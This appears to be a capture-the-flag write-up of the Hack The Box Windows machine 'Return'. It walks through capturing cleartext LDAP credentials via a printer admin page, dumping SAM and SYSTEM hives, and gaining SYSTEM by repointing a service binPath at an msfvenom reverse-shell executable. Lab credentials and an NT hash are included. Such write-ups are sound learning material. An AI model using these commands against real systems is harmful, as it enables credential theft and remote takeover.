---
tags:
  - Windows
  - HTTP
  - Coercion
  - Server Operators
  - Path hijacking
---

... is an easy HTB machine which allows you to coerce an account into authenticating to your service via `http`, gaining his credentials. For the privilege escalation, the user is part of the `BUILTIN\Server Operators` group, which allows him to modify the binary path of arbitrary services.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```
As this output is quite verbose, i will break it down below:

- Port `80`: Web service. The title `HTB Printer Admin Panel` looks promising.
- Port `139` and `445`: Usually both indicate `SMB`. Port `139` relies on legacy `NetBIOS` (support for older machines), port `445` is a newer version using `TCP/IP`. `SMB` is highly interesting for exploitation, as it allows access to files / printers over the network.
- Port `389` and `636`: Are used for `LDAP` and `LDAPS`. Are used in windows active-directory scenarios to authenticate users / authorize them to take certain actions.
- Port `5985`: Port for `WinRM`. Comparable to `ssh`, usually exclusive to Windows. Interesting if credentials are found.

As the `nmap` scan indicates, the domain name `return.local` is in use. That is why i edit my `/etc/hosts` file as follows for local `DNS` resolution:
```bash
echo "$IP return.local" | sudo tee --append /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# echo "...": writes the specified string into STDOUT (terminal)
# | : redirect (pipe) the STDOUT of the left command into the STDIN of the right command
# sudo tee --append /etc/hosts: write the received STDIN into a file without overwriting it. requires sudo, as that file is critical to the system  
```

As with any windows machine, i first try enumerating the `SMB` service using `netexec`. As `Null Auths` are allowed (known after scanning with `nxc smb return.local`), i can enumerate the shares with these credentials:
```bash
nxc smb return.local -u 'a' -p '' --shares
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: the username to use. can be anything, as it defaults to the user 'Guest', if the name is not found.
# -p: the password to use. empty here
# --shares: a flag which tells nxc to return a list of available shares.
```

This told me that i was not able to access the share, even though `Null Auth` is `true`. Oh well.

My next target was the `http` service, which i visit using `burpsuite`'s browser on `http://return.local`.The `view-source` reveals the two endpoints:

- `/index.php`: Shows me an image of a printer and the title `HTB Printer Admin Panel`.
- `/settings.php`: Accepts the parameters `Server Address`, `Server Port`, `Username`, and `Password`. The button `Update` sends a POST-request to `settings.php`. Oddly enough, only `Server Address` is used.

One thing to note is that the buttons `Fax` and `Troubleshooting` exist on this page, but they reference `javascript:void(0)`, which is strange. The default values for `settings.php` reveal the following information:

- `Server Address`: Another `VHost`, `printer.return.local`.
- `Server Port`: Communicates via `LDAP`, `389`.
- `Username`: Existing user, `svc-printer`.

Due to the new `VHost`, i also add it to my `/etc/hosts` file:
```bash
sudo sed -i "s/$IP return.local/$IP return.local printer.return.local/" /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: required, as we are editing /etc/hosts
# -i: edit the file in-place and overwrite it
# "s/old_word/new_word/": replaces each occurance of old_word with new_word
# /etc/hosts: file we want to edit
```

Visiting it does not yield new results though, it is the same web-page as `return.local`. Before trying to exploit the `/settings.php`, further enumeration is always nice on `http` endpoints to find out if anything is hidden from the regular user. I use `ffuf` to do forceful browsing on the URL endpoints, and also on the `Host:` parameter to find additional `VHosts`.

Forceful browsing command:
```bash
ffuf -w /usr/share/dirb/wordlists/big.txt -u "http://return.local/FUZZ.php" -fs 1245 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 1245 are "404" errors.
# -mc: accept any response code
```

`VHost` fuzzing command:
```bash
ffuf -w ./subdomains-top1million-110000.txt -H "Host: FUZZ.return.local" -u http://return.local -fs 28274 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -H: add specific header. Here, the header "FUZZ.return.local" is chosen. the FUZZ word is replaced by each entry of the wordlist!
# -u: URL of the target
# -fs: filter by response size
# -mc: accept any response code
```

Sadly, both of these strategies did not yield results, so the `settings.php` is the only way of interaction right now.

### Initial Exploitation
As the `Server Address` parameter from the `/settings.php` endpoint seemingly provides the only possible way of interacting with this machine, i focused on it. My first idea was trying to input my local IP-address and start `responder`. If successful, `responder` would force a challenge-response for the account which is requesting my resource, and that would lead to a `NTLMv2` hash, which is crack-able if the used password is weak.

I start `responder` using the following command:
```bash
sudo responder -I tun0
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -I: specify interface. here tun0, as that is the interface of the VPN
```

, input my own IP-address and click the `Update` button.

`responder` has shown me something which i have not yet seen:
```bash
# ...
[+] Listening for events...

[LDAP] Cleartext Client   : $IP
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

Apparently, the `LDAP` usage on the server simply sends the credentials via clear-text.

After enumerating the `SMB` service using these credentials, i notice that `svc-printer` has `READ,WRITE` permissions on the `C$` share, which implies that he has file-system access. That is a big clue on `WinRM` access, which is why i tried and succeeded with the following command:
```bash
evil-winrm -i return.local -u 'svc-printer' -p '1edFg43012!!'
```

### Privilege Escalation
With the `WinRM` access i usually always enumerate the privileges of the current user using `whoami /all`, and read the `PowerShell history` of the current user. That is not required though, as the `whoami /all` command reveals the following:
```powershell
Privilege Name                Description
============================  =================================
# ...
SeBackupPrivilege             Back up files and directories
# ...
```

Using this privilege i am able to back up the `SAM hive` and the `SYSTEM hive`, which contain credentials for the local users. I can save them using these commands:
```powershell
reg save hklm\sam C:\Users\svc-printer\Documents\sam.hive
```

... and:

```powershell
reg save hklm\system C:\Users\svc-printer\Documents\system.hive
```

I get those two files onto my local system using the `download` command from `evil-winrm`, and i use `impacket's` `secretsdump` to view the credentials in the form of `uid:rid:lmhash:nthash`:
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Using the `NTHash` part of the `Administrator's` credentials i can then `WinRM` onto the machine:
```bash
evil-winrm -i return.local -u 'return.local\Administrator' -H '34386a771aaca697f447754e4863d38a'
```

That is i would say if that would have worked... I assumed that the local `Administrator` did not have `WinRM` permissions to that machine.

Before starting a `bloodhound` scan, i investigated the output of the `whoami /all` command again, as it was quite verbose. And i noticed another interesting permission:
```powershell
Group Name                                 Type
========================================== ================
# ...
BUILTIN\Server Operators                   Alias
# ...
```

Googling this revealed [this blog-post](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/). It turns out that this group has the permission to configure, start, and stop services using the program `sc.exe`. It is comparable to `systemd / systemctl` in Linux systems. It is possible to configure the path to the binary (`binPath`) for a service, so that it executes custom code.

To find out which services are running on the system, i issue the following command:
```powershell
sc.exe query
```
Sadly, the current user does not have the required permissions to read them. Therefore, i will query if specific services even exist. I will use the service `VMTools` from the blog post first:
```bash
sc.exe qc VMTools
```
This shows output for this service, which means it is accessible and write-able!

For the next step i need a `EXE` file which gets executed on the target. I have chosen the `stageless` `reverse-TCP` payload of `msfvenom` to reduce the hassle of creating a custom one:
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=<my-IP> lport=1337 -f exe > shell.exe
```
I upload the resulting `EXE` using the `upload` command from `evil-winrm` to the location `C:\Users\svc-printer\Documents`.

Before attempting to mess with the binary path of the service `VMTools`, i start a listener for incoming reverse shell connections:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

The last step is to modify the `binPath` value of the `VMTools` service, and then to start it:
```bash
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\shell.exe"
```
... and:
```bash
sc.exe start VMTools
```

This gives me a reverse shell as `NT AUTHORITY\SYSTEM` on my `nc` listener.

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE.

``` mermaid
graph LR
  A[HTTP<br>Service] -->|LDAP<br>coercion| B[Valid<br>credentials];
  B -->|Use| C[WinRM<br>Access];
```

The privilege escalation to the user `SYSTEM` worked as follows:

``` mermaid
graph LR
  A[WinRM<br>Access] -->|Write| B[Binary<br>path<br>of Service];
  B -->|Leads to| C[Code<br>execution<br>as SYSTEM];
```